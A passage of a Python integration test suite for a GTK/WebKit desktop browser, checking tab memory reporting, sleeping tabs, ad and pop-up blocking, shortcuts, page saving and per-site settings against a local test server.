        js(wv, "window.perm = 'waiting'; Notification.requestPermission().then(p => { window.perm = p }); 1")
        self.assertTrue(spin(lambda: js(wv, "window.perm") != "waiting", 5))
        self.assertEqual(js(wv, "window.perm"), "granted")

    def measure(self, tabs=None):
        box = {}
        self.win.measure_tab_memory(lambda r: box.setdefault("r", r), tabs)
        self.assertTrue(spin(lambda: "r" in box, 30), "memory measurement never finished")
        return box["r"]

    def test_tab_memory_finds_the_heavy_tab(self):
        before = len(self.win._tab_boxes())
        self.win.create_new_tab(self.base + "/blank")
        spin(lambda: False, 1.5)
        self.win.create_new_tab(self.base + "/mem-heavy")
        spin(lambda: False, 2.5)
        self.addCleanup(lambda: [self.win.close_tab(t) for t in self.win._tab_boxes()[before:]])
        results = self.measure()
        new = {t._arrow_label.get_text(): i for t, i in results.items() if t in self.win._tab_boxes()[before:]}
        self.assertEqual(set(new), {"blank", "mem-heavy"})
        for info in new.values():
            self.assertEqual(info["state"], "ok")
        self.assertNotEqual(new["blank"]["pid"], new["mem-heavy"]["pid"], "each tab has its own renderer")
        self.assertGreater(new["mem-heavy"]["mb"], new["blank"]["mb"] + 60, "the tab holding ~160 MB is the heavy one")
        # a repeat measurement reuses the match instead of probing again
        again = self.measure()
        self.assertEqual({t: i["pid"] for t, i in results.items() if t in again},
                         {t: i["pid"] for t, i in again.items() if t in results})

    def test_tab_memory_works_next_to_a_busy_tab(self):
        # A busy page used to hide the probe's CPU jump, so every other tab showed "—".
        before = len(self.win._tab_boxes())
        for path in ("/blank", "/thin", "/busy"):
            self.win.create_new_tab(self.base + path)
            spin(lambda: False, 1.5)
        self.addCleanup(lambda: [self.win.close_tab(t) for t in self.win._tab_boxes()[before:]])
        results = self.measure(self.win._tab_boxes()[before:])
        found = {t._arrow_label.get_text(): i for t, i in results.items()}
        self.assertEqual({k: i["state"] for k, i in found.items()}, {"blank": "ok", "thin": "ok", "busy": "ok"})
        self.assertEqual(len({i["pid"] for i in found.values()}), 3, "each tab has its own renderer")

    def test_tab_memory_reports_suspended_tabs_and_dialog_opens(self):
        self.win.create_new_tab(self.base + "/blank")
        spin(lambda: False, 1.0)
        victim = self.win._tab_boxes()[-1]
        self.win.create_new_tab(self.base + "/blank")  # becomes the active tab
        spin(lambda: False, 1.0)
        self.addCleanup(lambda: [self.win.close_tab(t) for t in (victim, self.win._tab_boxes()[-1]) if t.get_parent()])
        self.win._suspend_tab(victim)
        spin(lambda: False, 1.0)
        self.assertEqual(self.measure([victim])[victim]["state"], "suspended")
        seen = {}

        def close_dialog():
            for w in Gtk.Window.list_toplevels():
                if isinstance(w, Gtk.Dialog) and w.get_title() == "Tab Memory":
                    seen["title"] = w.get_title()
                    w.response(Gtk.ResponseType.CLOSE)
            return False

        GLib.timeout_add(2500, close_dialog)
        self.win.open_tab_memory()  # modal: returns once close_dialog() has dismissed it
        self.assertEqual(seen.get("title"), "Tab Memory")

    # ---- sleeping tabs ---------------------------------------------------
    def open_tab(self, path, title):
        self.win.create_new_tab(self.base + path)
        tab = self.win._tab_boxes()[-1]
        self.assertTrue(spin(lambda: tab._arrow_webview.get_title() == title and not tab._arrow_webview.is_loading(), 10))
        return tab

    def close_new_tabs(self, before):
        for tab in self.win._tab_boxes():
            if tab not in before:
                self.win.close_tab(tab)

    def asleep(self, tab):
        return id(tab) in self.win._suspended_session_states

    def test_unresponsive_page_does_not_stop_memory_relief(self):
        win = self.win
        win.create_new_tab(self.base + "/blank")
        tab = win.notebook.get_nth_page(win.notebook.get_n_pages() - 1)
        win.create_new_tab(self.base + "/thin")
        front = win.notebook.get_nth_page(win.notebook.get_n_pages() - 1)
        try:
            self.assertTrue(spin(lambda: not tab._arrow_webview.is_loading(), 10))
            # A renderer stuck in a script never answers the typed-text check.
            tab._arrow_webview.run_javascript_in_world = lambda *args: None
            win.TYPED_TEXT_CHECK_TIMEOUT_MS = 200
            results = []
            win._sleep_unless_typed(tab, results.append)
            self.assertTrue(spin(lambda: results, 3), "never decided")
            self.assertEqual(results, [False], "a page that doesn't answer stays awake")
            self.assertFalse(self.asleep(tab))
            spin(lambda: False, 0.3)
            self.assertEqual(results, [False], "decided once")

            win._relieving_memory_pressure = False
            win._relieve_memory_pressure()
            self.assertTrue(spin(lambda: not win._relieving_memory_pressure, 3), "memory relief stays locked out")
        finally:
            del win.TYPED_TEXT_CHECK_TIMEOUT_MS
            del tab._arrow_webview.run_javascript_in_world
            win.close_tab(front)
            win.close_tab(tab)

    def test_sleeping_tab_ends_its_renderer_and_comes_back(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        tab = self.open_tab("/article", "Test Article")
        wv = tab._arrow_webview
        wv.load_uri(self.base + "/done")
        self.assertTrue(spin(lambda: wv.get_title() == "done", 10))
        self.open_tab("/blank", "blank")
        pid = self.measure([tab])[tab]["pid"]
        self.assertIsNotNone(pid)
        self.assertTrue(self.win._suspend_tab(tab))
        self.assertTrue(spin(lambda: pid not in bb.web_process_pids(), 5), "the sleeping tab's renderer is gone")
        self.assertTrue(tab._arrow_label.get_text().startswith("💤"))
        self.assertIn(self.base + "/done", self.win._collect_session()[0], "still saved in the session")
        self.win.notebook.set_current_page(self.win.notebook.page_num(tab))
        self.assertTrue(spin(lambda: wv.get_title() == "done" and not wv.is_loading(), 10), "reloads where it was")
        self.assertTrue(wv.can_go_back(), "with its history")
        self.assertFalse(self.asleep(tab))

    def test_restored_session_loads_only_the_tab_you_open(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        before = len(self.win._tab_boxes())
        urls = [self.base + "/r1", self.base + "/r2", self.base + "/blank"]
        self.win.restore_tabs(urls)
        r1, r2, last = self.win._tab_boxes()[before:]
        self.assertIs(self.win.get_active_tab_box(), last)
        self.assertTrue(spin(lambda: last._arrow_webview.get_title() == "blank", 10), "the tab you land on loads")
        spin(lambda: False, 1.0)
        self.assertEqual((Handler.hits.get("/r1", 0), Handler.hits.get("/r2", 0)), (0, 0), "the others wait")
        self.assertEqual(r1._arrow_label.get_text(), "💤 127.0.0.1")
        self.assertEqual(self.win._collect_session()[0][-3:], urls, "all of them stay in the session")
        self.win.notebook.set_current_page(self.win.notebook.page_num(r1))
        self.assertTrue(spin(lambda: Handler.hits.get("/r1", 0) > 0, 5), "opening a tab loads it")
        self.assertEqual(Handler.hits.get("/r2", 0), 0)

    def test_automatic_sleep_keeps_pinned_and_typed_in_tabs(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        plain = self.open_tab("/blank", "blank")
        pinned = self.open_tab("/thin", "thin")
        self.win.set_tab_pinned(pinned, True)
        typed = self.open_tab("/form", "form")
        js(typed._arrow_webview, "const t=document.getElementById('t'); t.value='a reply in progress';"
                                  "t.dispatchEvent(new Event('input', {bubbles: true})); 1")
        self.open_tab("/blank", "blank")
        for tab in (plain, pinned, typed):
            self.win._tab_last_active[id(tab)] = time.monotonic() - 3600
        self.win._check_tab_suspension()
        self.assertTrue(spin(lambda: self.asleep(plain), 5), "an idle tab goes to sleep")
        spin(lambda: False, 1.0)
        self.assertFalse(self.asleep(pinned), "pinned tabs stay awake")
        self.assertFalse(self.asleep(typed), "so do tabs holding typed text")
        js(typed._arrow_webview, "document.getElementById('t').value=''; 1")  # the reply was sent
        self.win._check_tab_suspension()
        self.assertTrue(spin(lambda: self.asleep(typed), 5))

    def test_low_memory_puts_the_oldest_background_tab_to_sleep(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        oldest = self.open_tab("/blank", "blank")
        older = self.open_tab("/thin", "thin")
        self.open_tab("/blank", "blank")
        now = time.monotonic()
        self.win._tab_last_active[id(oldest)] = now - 100000
        self.win._tab_last_active[id(older)] = now - 50000
        real = bb.system_memory_mb
        self.addCleanup(setattr, bb, "system_memory_mb", real)
        bb.system_memory_mb = lambda: (4000.0, 8000.0)
        self.win._check_memory_pressure()
        spin(lambda: False, 1.0)
        self.assertFalse(self.asleep(oldest), "nothing sleeps while memory is fine")
        bb.system_memory_mb = lambda: (300.0, 8000.0)
        self.win._check_memory_pressure()
        self.assertTrue(spin(lambda: self.asleep(oldest), 5), "least recently used goes first")
        self.assertFalse(self.asleep(older), "one tab per check")
        self.win._check_memory_pressure()
        self.assertTrue(spin(lambda: self.asleep(older), 5))

    def test_new_tab_with_ad_blocking_off_leaves_its_opener_blocked(self):
        # A tab opened by a page shares its opener's content manager (WebKit uses the opener's in the renderer
        # anyway). Switching ad blocking off for the new tab's site used to switch it off in the opener too,
        # for good. Now it stays on while any tab sharing it wants it, and follows the site once alone.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        bb.set_site_value(self.win.site_settings, "localhost", "adblock", False)
        opener_tab = self.open_tab("/winopener", "winopener")
        opener = opener_tab._arrow_webview
        count = self.win.notebook.get_n_pages()
        js(opener, "document.getElementById('p').click()")
        self.assertTrue(spin(lambda: self.win.notebook.get_n_pages() == count + 1, 5), "no new tab")
        popup = self.win._tab_boxes()[-1]._arrow_webview
        self.assertTrue(spin(lambda: popup.get_title() == "blank" and not popup.is_loading(), 10))
        self.assertEqual(js(popup, "window.opener !== null"), "true", "still a real popup of its opener")
        add_image = "var i = new Image(); i.src = '%s'; document.body.appendChild(i); 1"
        js(opener, add_image % "/pagead/opener.png")
        js(popup, add_image % "/pagead/popup.png")
        spin(lambda: False, 1.0)
        self.assertEqual(Handler.hits.get("/pagead/opener.png", 0), 0, "the opener is still protected")
        self.assertEqual(Handler.hits.get("/pagead/popup.png", 0), 0, "so is the tab sharing its blocker")
        self.win.close_tab(opener_tab)
        popup.reload()
        self.assertTrue(spin(lambda: not popup.is_loading(), 5))
        js(popup, add_image % "/pagead/alone.png")
        self.assertTrue(spin(lambda: Handler.hits.get("/pagead/alone.png", 0) > 0, 5),
                        "once alone, the tab follows its site's choice (ad blocking off)")

    # ---- shortcuts, saving, source, right-click menu, clearing a site ------
    def press(self, keyval, ctrl=False, shift=False, alt=False):
        event = Gdk.Event.new(Gdk.EventType.KEY_PRESS)
        event.keyval = keyval
        event.state = ((Gdk.ModifierType.CONTROL_MASK if ctrl else 0) | (Gdk.ModifierType.SHIFT_MASK if shift else 0)
                       | (Gdk.ModifierType.MOD1_MASK if alt else 0))
        return self.win.on_key_press(self.win, event)

    def test_tab_and_find_shortcuts(self):
        win = self.win
        self.addCleanup(self.close_new_tabs, win._tab_boxes())
        for _ in range(3):
            self.open_tab("/thin", "thin")
        n = win.notebook.get_n_pages()
        self.assertTrue(self.press(Gdk.KEY_1, ctrl=True))
        self.assertEqual(win.notebook.get_current_page(), 0)
        self.press(Gdk.KEY_9, ctrl=True)
        self.assertEqual(win.notebook.get_current_page(), n - 1, "Ctrl+9 is the last tab")
        self.press(Gdk.KEY_2, ctrl=True)
        self.press(Gdk.KEY_Page_Down, ctrl=True)
        self.assertEqual(win.notebook.get_current_page(), 2)
        self.press(Gdk.KEY_Page_Up, ctrl=True)
        self.assertEqual(win.notebook.get_current_page(), 1)
        win.close_find_bar()
        self.press(Gdk.KEY_F3)
        self.assertTrue(win.find_bar.get_visible(), "F3 with nothing to find opens the find bar")
        win.close_find_bar()

    def test_f11_puts_the_window_full_screen_and_back(self):
        win = self.win
        full = lambda: bool(win.get_window().get_state() & Gdk.WindowState.FULLSCREEN)
        self.addCleanup(lambda: full() and win.unfullscreen())
        self.press(Gdk.KEY_F11)
        self.assertTrue(spin(full, 5))
        self.press(Gdk.KEY_F11)
        self.assertTrue(spin(lambda: not full(), 5))

    def test_save_page_makes_a_file_arrow_opens_again(self):
        wv = self.load("/article", "Test Article")
        path = os.path.join(_HOME, "saved page.mhtml")
        result = []
        self.win.save_page_to(wv, path, result.append)
        self.assertTrue(spin(lambda: result, 10))
        self.assertEqual(result, [True])
        with open(path, "rb") as f:
            self.assertIn(b"The Great Test", f.read())
        wv.load_uri("file://" + path)
        self.assertTrue(spin(lambda: wv.get_title() == "Test Article" and not wv.is_loading(), 10), wv.get_title())

    def test_view_source_shows_the_html_as_text(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        self.load("/article", "Test Article")
        tabs = []
        self.win.view_page_source(tabs.append)
        self.assertTrue(spin(lambda: tabs and tabs[0].get_title() == f"Source of {self.base}/article", 10))
        self.assertIn("<h1>The Great Test</h1>", js(tabs[0], "document.querySelector('pre').textContent"))
        self.assertEqual(js(tabs[0], "document.querySelectorAll('pre h1, pre p').length"), "0", "shown, not run")

    def menu_items(self, webview, element_id):
        """Right-click an element; the visible menu's items, keyed by label without mnemonics."""
        self.mouse_click(webview, element_id, 3)
        items = []

        def collect(widget):
            if isinstance(widget, Gtk.MenuItem) and widget.get_mapped() and widget.get_label():
                items.append(widget)
            if isinstance(widget, Gtk.Container):
                for child in widget.get_children():
                    collect(child)

        self.assertTrue(spin(lambda: [collect(w) for w in Gtk.Window.list_toplevels()] and items, 3), "no menu")
        self.addCleanup(self.close_menus, items)
        return {i.get_label().replace("_", ""): i for i in items}

    @staticmethod
    def close_menus(items):
        for menu in {id(i.get_parent()): i.get_parent() for i in items}.values():
            if isinstance(menu, Gtk.Menu):
                menu.popdown()
        spin(lambda: False, 0.2)

    def test_right_click_copy_clean_link_and_private_window(self):
        win = self.win
        self.addCleanup(self.close_new_tabs, win._tab_boxes())
        tab = self.open_tab("/menu", "menu")
        wv = tab._arrow_webview
        win.notebook.set_current_page(win.notebook.page_num(tab))
        items = self.menu_items(wv, "link")
        self.assertIn("Open Link in Private Window", items)
        items["Copy Clean Link (without tracking tags)"].activate()
        clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
        self.assertTrue(spin(lambda: clipboard.wait_for_text() == self.base + "/done?k=1", 3), clipboard.wait_for_text())

    def test_right_click_searches_for_selected_text(self):
        # Its own test: after one synthetic right-click menu, the next synthetic click clears the selection.
        win = self.win
        self.addCleanup(self.close_new_tabs, win._tab_boxes())
        tab = self.open_tab("/menu", "menu")
        wv = tab._arrow_webview
        win.notebook.set_current_page(win.notebook.page_num(tab))
        saved = (win.search_engine, list(win.custom_search_engines))
        self.addCleanup(lambda: (setattr(win, "search_engine", saved[0]), setattr(win, "custom_search_engines", saved[1])))
        win.custom_search_engines = [{"name": "Local", "url": self.base + "/thin?q={query}"}]
        win.search_engine = "Local"
        js(wv, "window.getSelection().selectAllChildren(document.getElementById('words')); 1")
        items = self.menu_items(wv, "words")
        self.assertIn("Search Local for the Selected Text", items)
        items["Search Local for the Selected Text"].activate()
        self.assertTrue(spin(lambda: "/thin?q=hello%20world" in Handler.requests, 5), Handler.requests)

    def test_padlock_clears_one_sites_cookies(self):
        wv = self.load("/blank", "blank")
        js(wv, "document.cookie = 'mine=1; max-age=3600'; localStorage.setItem('k', 'v'); 1")
        self.assertIn("mine=1", js(wv, "document.cookie"))
        self.win.clear_site_data(wv, "127.0.0.1", confirm=False)
        self.assertTrue(spin(lambda: js(wv, "document.cookie") == "" and not wv.is_loading(), 10), "cookie still there")
        self.assertEqual(js(wv, "String(localStorage.getItem('k'))"), "null")

    # ---- element hiding ---------------------------------------------------
    def test_ad_boxes_and_cookie_banners_are_hidden_unless_switched_off(self):
        win = self.win
        win.hide_cookie_banners = True  # off by default
        hiding = {"ads": {"generic": [".arrow-test-ad"], "exceptions": {},
                          "specific": [[["127.0.0.1"], [".arrow-site-only"]], [["other.example"], ["#ok"]]]},
                  "cookies": {"generic": [".arrow-test-cookie"], "exceptions": {}, "specific": []}}
        for kind, data in hiding.items():
            with open(bb.COSMETIC_CACHES[kind], "w") as f:
                json.dump(data, f)

        def undo():
            for path in bb.COSMETIC_CACHES.values():
                os.remove(path)
            win.hide_cookie_banners = False
            win._compile_content_blocker_filter()

        self.addCleanup(undo)
        win._compile_content_blocker_filter()
        self.assertTrue(spin(lambda: len(win.cosmetic_filters) == 2, 60), "element hiding never compiled")
        shown = ("JSON.stringify(['ad', 'ck', 'site', 'ok'].map(id => "
                 "getComputedStyle(document.getElementById(id)).display !== 'none'))")
        wv = self.load("/hiding", "hiding")
        self.assertEqual(js(wv, shown), "[false,false,false,true]", "ad box, cookie banner and site rule hidden")
        win.on_hide_cookie_banners_toggled(False)
        wv.reload()
        self.assertTrue(spin(lambda: not wv.is_loading(), 5))
        self.assertEqual(js(wv, shown), "[false,true,false,true]", "cookie banners shown when switched off")
        bb.set_site_value(win.site_settings, "127.0.0.1", "adblock", False)
        self.load("/blank")
        wv = self.load("/hiding", "hiding")
        self.assertEqual(js(wv, shown), "[true,true,true,true]", "nothing hidden where ad blocking is off")

    def test_switching_list_updates_off_drops_the_downloaded_list(self):
        win = self.win
        self.assertTrue(spin(lambda: win._content_filter_rank > 0, 30), "the test list never compiled")
        self.addCleanup(lambda: spin(lambda: win._content_filter_rank > 0, 30))
        self.addCleanup(win.on_tracker_lists_toggled, True)
        win.on_tracker_lists_toggled(False)
        self.assertTrue(spin(lambda: win._content_filter_rank == 0, 30),
                        "the bigger downloaded list stayed on (a smaller filter was never installed)")
        win.on_tracker_lists_toggled(True)
        self.assertTrue(spin(lambda: win._content_filter_rank > 0, 30))

    def test_cookie_banner_list_is_off_by_default_and_only_downloaded_while_on(self):
        self.assertFalse(self.started_hiding_cookie_banners, "a profile without the setting")
        win, asked, done = self.win, [], []
        real = bb.fetch_tracker_list
        bb.fetch_tracker_list = lambda **kwargs: asked.append(kwargs.get("cookie_url"))
        self.addCleanup(setattr, bb, "fetch_tracker_list", real)
        self.addCleanup(setattr, win, "hide_cookie_banners", False)
        for on in (False, True):
            win.hide_cookie_banners = on
            win.refresh_tracker_list_async(on_done=done.append, url_rules=False)
            self.assertTrue(spin(lambda: len(done) == len(asked) == int(on) + 1, 10))
        self.assertEqual(asked, [None, bb.COOKIE_LIST_URL])

    def test_cookie_banner_switch_downloads_only_a_missing_cookie_list(self):
        win = self.win
        calls = []
        win.refresh_tracker_list_async = lambda *args, **kwargs: calls.append(kwargs)
        self.addCleanup(delattr, win, "refresh_tracker_list_async")
        self.addCleanup(win.on_hide_cookie_banners_toggled, win.hide_cookie_banners)
        path = bb.COSMETIC_CACHES["cookies"]
        if os.path.exists(path):
            os.remove(path)
        win.on_hide_cookie_banners_toggled(False)
        win.on_hide_cookie_banners_toggled(True)
        self.assertEqual(calls, [{"lists": False, "url_rules": False, "cookie_list": True}], "only the cookie list")
        with open(path, "w") as f:
            json.dump({"generic": [], "exceptions": {}, "specific": []}, f)  # there, but it never compiled
        self.addCleanup(os.remove, path)
        win.on_hide_cookie_banners_toggled(False)
        win.on_hide_cookie_banners_toggled(True)
        self.assertEqual(len(calls), 1, "a list that's there isn't downloaded again")

    def test_password_import_stops_when_the_keyring_stays_locked(self):
        class LockedSecrets(FakeSecrets):
            def __init__(self):
                super().__init__()
                self.unlock_refused, self.tries = False, 0

            def store(self, host, user, password):
                self.tries += 1
                self.unlock_refused = True  # the user closed the unlock dialog
                return False

        win = self.win
        win.secrets = LockedSecrets()
        self.addCleanup(setattr, win, "secrets", FakeSecrets())
        status = Gtk.Label()
        logins = [{"host": f"s{i}.example", "username": "u", "password": "p"} for i in range(30)]
        offered = []
        win.save_imported_logins(logins, "passwords.csv", status, lambda: offered.append(1))
        self.assertTrue(spin(lambda: "stayed locked" in status.get_text(), 5), status.get_text())
        self.assertEqual(win.secrets.tries, 1, "asked to unlock once, not once per login")
        self.assertIn("other 30 weren't saved", status.get_text())
        self.assertEqual(offered, [], "nothing saved: no offer to delete the file")

    # ---- pop-up blocker ---------------------------------------------------
    def popup_page(self, adblock=True):
        """The /popups page in a tab in front. A script's click() on its elements counts as the user's click,
        so the windows they open reach the blocker (a bare window.open() from js() never would). The test
        tracker list blocks `localhost`, and WebKit's own blocker drops window.open() to a listed site before
        Arrow is asked, so tests of other pop-ups to localhost turn ad blocking off on the page's site."""
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        if not adblock:
            bb.set_site_value(self.win.site_settings, "127.0.0.1", "adblock", False)
        tab = self.open_tab("/popups", "popups")
        self.win.notebook.set_current_page(self.win.notebook.page_num(tab))
        self.assertTrue(spin(lambda: self.win.get_active_webview() is tab._arrow_webview, 5))
        return tab._arrow_webview

    def try_popup(self, page, uri):
        """What window.open(uri) gives a click handler on the page: "null" when blocked."""
        return js(page, f"window.res = 'none'; window.to = '{uri}'; document.getElementById('open').click(); window.res")

    def test_popup_to_another_site_is_blocked_and_can_be_allowed_once(self):
        win, page = self.win, self.popup_page(adblock=False)
        count, before = win.notebook.get_n_pages(), win.stats.get("popups", 0)
        other = f"http://localhost:{self.port}/thin"
        self.assertEqual(self.try_popup(page, other), "null", "the page is told it was blocked")
        self.assertEqual(self.try_popup(page, other + "?again"), "null")
        spin(lambda: False, 0.5)
        self.assertEqual(win.notebook.get_n_pages(), count, "no tab opened")
        self.assertEqual(Handler.hits.get("/thin", 0), 0)
        self.assertEqual(win.stats["popups"], before + 2)
        self.assertEqual(self.infobar_text(), "🚫 Blocked 2 pop-ups from 127.0.0.1.", "one bar, counting")
        win._infobar.response(1)  # Allow once
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 1, 5), "the blocked pop-up opened")
        self.assertTrue(spin(lambda: Handler.hits.get("/thin", 0) == 1, 5))
        win.notebook.set_current_page(win.notebook.page_num(page.get_parent()))
        self.assertNotEqual(self.try_popup(page, other), "null", "more pop-ups on this page are allowed")
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 2, 5))
        self.assertNotIn("popups", win.site_settings["127.0.0.1"], "only once: nothing saved")
        page.reload()
        self.assertTrue(spin(lambda: not page.is_loading(), 5))
        self.assertEqual(self.try_popup(page, other), "null", "blocked again on the next page")

    def test_popup_bar_goes_away_by_itself(self):
        win, page = self.win, self.popup_page(adblock=False)
        other = f"http://localhost:{self.port}/thin"
        self.assertEqual(win.POPUP_BAR_SECONDS, 3)
        self.assertIsInstance(win._pointer_over(win.btn_back), bool, "reads the real pointer")
        win._pointer_over = lambda widget: False
        self.addCleanup(delattr, win, "_pointer_over")
        self.try_popup(page, other)
        self.assertTrue(self.infobar_text().startswith("🚫 Blocked a pop-up"))
        spin(lambda: False, 2.0)
        self.assertIsNotNone(win._infobar, "still up after 2 s")
        self.try_popup(page, other)  # a second pop-up starts the 3 s again
        spin(lambda: False, 2.0)
        self.assertEqual(self.infobar_text(), "🚫 Blocked 2 pop-ups from 127.0.0.1.")
        self.assertTrue(spin(lambda: win._infobar is None, 2.0), "gone 3 s after the last pop-up")
        # it waits while the pointer is on it, so it never vanishes just as "Allow once" is clicked
        win._pointer_over = lambda widget: True
        self.try_popup(page, other)
        spin(lambda: False, 3.5)
        self.assertIsNotNone(win._infobar, "kept while the pointer is on it")
        win._pointer_over = lambda widget: False
        self.assertTrue(spin(lambda: win._infobar is None, 4.0), "goes once the pointer leaves")

    def test_always_allow_and_the_padlock_switch_let_a_site_open_popups(self):
        win, page = self.win, self.popup_page(adblock=False)
        count = win.notebook.get_n_pages()
        other = f"http://localhost:{self.port}/thin"
        self.assertEqual(self.try_popup(page, other), "null")
        win._infobar.response(2)  # Always allow on 127.0.0.1
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 1, 5))
        self.assertEqual(win.site_settings["127.0.0.1"], {"adblock": False, "popups": True})
        self.assertEqual(win._describe_site_entry(win.site_settings["127.0.0.1"]), "ad blocking off, pop-ups allowed")
        win.notebook.set_current_page(win.notebook.page_num(page.get_parent()))
        page.reload()
        self.assertTrue(spin(lambda: not page.is_loading(), 5))
        self.assertNotEqual(self.try_popup(page, other), "null", "remembered for the site")
        win.notebook.set_current_page(win.notebook.page_num(page.get_parent()))
        # the padlock's panel shows the choice; switching it off blocks pop-ups again
        shown, popup = [], Gtk.Popover.popup
        Gtk.Popover.popup = lambda pop: (shown.append(pop), popup(pop))[1]
        self.addCleanup(setattr, Gtk.Popover, "popup", popup)
        win.show_site_popover()

        def rows(widget):
            if isinstance(widget, Gtk.Container):
                kids = widget.get_children()
                labels = [k.get_text() for k in kids if isinstance(k, Gtk.Label)]
                switches = [k for k in kids if isinstance(k, Gtk.Switch)]
                if labels and switches:
                    yield labels[0], switches[0]
                for kid in kids:
                    yield from rows(kid)

        switch = dict(rows(shown[0]))["Allow pop-ups"]
        self.assertTrue(switch.get_active())
        switch.set_active(False)
        shown[0].popdown()
        self.assertEqual(win.site_settings["127.0.0.1"], {"adblock": False})
        self.assertEqual(self.try_popup(page, other), "null")

    def test_links_own_site_and_sign_in_windows_still_open(self):
        win, page = self.win, self.popup_page()
        count = win.notebook.get_n_pages()
        js(page, "document.getElementById('link').click()")
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 1, 5), "a target=_blank link opens")
        win.notebook.set_current_page(win.notebook.page_num(page.get_parent()))
        self.assertNotEqual(self.try_popup(page, self.base + "/blank"), "null", "the site's own window opens")
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 2, 5))
        self.assertIsNone(win._infobar)

    def mouse_click(self, webview, element_id, button):
        """A real mouse click (press and release) on an element, sent to the web view like GTK would."""
        r = json.loads(js(webview, f"JSON.stringify(document.getElementById('{element_id}').getBoundingClientRect())"))
        pointer = Gdk.Display.get_default().get_default_seat().get_pointer()
        for kind in (Gdk.EventType.BUTTON_PRESS, Gdk.EventType.BUTTON_RELEASE):
            event = Gdk.Event.new(kind)
            event.button.window = webview.get_window()
            event.button.x, event.button.y = r["x"] + r["width"] / 2, r["y"] + r["height"] / 2
            event.button.button, event.button.time = button, Gdk.CURRENT_TIME
            event.set_device(pointer)
            webview.event(event)
            spin(lambda: False, 0.2)

    def test_right_click_opens_a_link_in_a_new_tab_and_middle_click_too(self):
        # WebKit's own "Open Link in New Window" item reaches the pop-up blocker as a script pop-up without a
        # click, so it was blocked for links to other sites. Arrow's "Open Link in New Tab" replaces it.
        win, page = self.win, self.popup_page()
        count = win.notebook.get_n_pages()
        self.mouse_click(page, "link", 3)
        items = []

        def collect(widget):
            if isinstance(widget, Gtk.MenuItem) and widget.get_mapped():
                items.append(widget)
            if isinstance(widget, Gtk.Container):
                for child in widget.get_children():
                    collect(child)

        self.assertTrue(spin(lambda: [collect(w) for w in Gtk.Window.list_toplevels()] and items, 3), "no menu")
        labels = [i.get_label().replace("_", "") for i in items]
        self.assertIn("Open Link in New Tab", labels)
        self.assertNotIn("Open Link in New Window", labels)
        items[labels.index("Open Link in New Tab")].activate()
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 1, 5), "the link opened in a new tab")
        self.assertIsNone(win._infobar, "not mistaken for a pop-up")
        self.close_menus(items)
        win.notebook.set_current_page(win.notebook.page_num(page.get_parent()))
        self.mouse_click(page, "link", 2)
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 2, 5), "middle-click opens a tab")

    def test_known_popup_ad_is_blocked_quietly_even_behind_a_link(self):
        win, page = self.win, self.popup_page()
        with open(bb.POPUP_LIST_CACHE, "w") as f:
            json.dump({"fetched": time.time(), "domains": ["127.0.0.2"]}, f)
        self.addCleanup(os.remove, bb.POPUP_LIST_CACHE)
        count, before = win.notebook.get_n_pages(), win.stats.get("popups", 0)
        js(page, "document.getElementById('ad').click()")  # ad scripts fake exactly this kind of click
        spin(lambda: False, 0.7)
        self.assertEqual(win.notebook.get_n_pages(), count)
        self.assertEqual(win.stats["popups"], before + 1)
        self.assertIsNone(win._infobar, "no offer to open an ad")
        bb.set_site_value(win.site_settings, "127.0.0.1", "adblock", False)
        js(page, "document.getElementById('ad').click()")
        self.assertTrue(spin(lambda: win.notebook.get_n_pages() == count + 1, 5), "ad blocking off: it opens")

    def test_single_word_in_the_address_bar_is_a_search(self):
        win = self.win
        saved = (win.search_engine, list(win.custom_search_engines))
        self.addCleanup(lambda: (setattr(win, "search_engine", saved[0]), setattr(win, "custom_search_engines", saved[1])))
        win.custom_search_engines = [{"name": "Local", "keyword": "", "url": self.base + "/done?q={query}"}]
        win.search_engine = "Local"
        wv = win.get_active_webview()
        win.url_entry.set_text("weather")
        win.on_url_activate(win.url_entry)
        self.assertTrue(spin(lambda: (wv.get_uri() or "") == self.base + "/done?q=weather" and not wv.is_loading(), 10),
                        wv.get_uri())

    def test_page_needs_permission_for_several_downloads(self):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        before = len(self.win.downloads_history)
        self.load("/dlframes", "dlframes")
        bar = lambda: self.win._infobar
        self.assertTrue(spin(lambda: bar() is not None and "4 more files" in bar()._arrow_message.get_text(), 10),
                        "the page's extra downloads were not held")
        self.assertEqual(len(self.win.downloads_history) - before, 1, "one download goes ahead without asking")
        bar().response(1)  # Allow
        self.assertTrue(spin(lambda: len(os.listdir(folder)) == 5 and all(
            e["status"] == "Completed ✅" for e in self.win.downloads_history[before:]), 10), os.listdir(folder))

    def test_video_formats_are_the_engines_own_answers(self):
        wv = self.load("/blank")
        types = ['video/mp4; codecs="avc1.42E01E"', 'video/mp4; codecs="dvh1.05.06"', 'audio/mp4; codecs="ec-3"',
                 'video/webm; codecs="vp9"', 'audio/webm; codecs="opus"']
        probe = ("JSON.stringify(%s.map(t => [MediaSource.isTypeSupported(t), "
                 "document.createElement('video').canPlayType(t)]))" % json.dumps(types))
        box = {}
        wv.run_javascript_in_world(probe, "test-engine", None,
                                   lambda v, r, _d: box.setdefault("v", v.run_javascript_in_world_finish(r)
                                                                   .get_js_value().to_string()), None)
        self.assertTrue(spin(lambda: "v" in box, 5))
        self.assertEqual(js(wv, probe), box["v"], "the page hears what the engine can really play")
        av1 = json.dumps('video/mp4; codecs="av01.0.05M.08"')
        self.assertEqual(js(wv, "JSON.stringify([MediaSource.isTypeSupported(%s), "
                                "document.createElement('video').canPlayType(%s)])" % (av1, av1)),
                         '[false,""]', "AV1 stays turned down")

